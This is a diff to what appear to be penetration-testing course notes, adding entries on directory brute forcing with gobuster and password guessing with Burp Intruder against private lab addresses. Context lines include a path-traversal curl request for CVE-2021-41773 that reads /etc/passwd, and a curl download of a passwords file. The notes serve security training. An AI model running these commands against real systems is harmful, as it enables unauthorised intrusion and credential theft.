@@ -489,6 +489,13 @@
   `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.173.13`
   `curl -s --path-as-is http://192.168.173.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`  
 
+### Introduction to Web Application Attacks  
+- 8.2.3 Directory Brute Force with Gobuster
+  `gobuster dir -u 192.168.173.16 -w /usr/share/wordlists/dirb/common.txt -t5 -b 301`: exclude bad status code 301 redirection to continue
+  `gobuster dir -u 192.168.173.52 -w /usr/share/wordlists/dirb/common.txt -t5`  
+- Security Testing with Burp Suite
+  `curl http://192.168.173.52/passwords.txt`: download password  
+  burp intruder on POST /login.php + position (password=admin)  
 ### Password Attacks  
 - 16.1.1 SSH and RDP
   **SSH** guess password
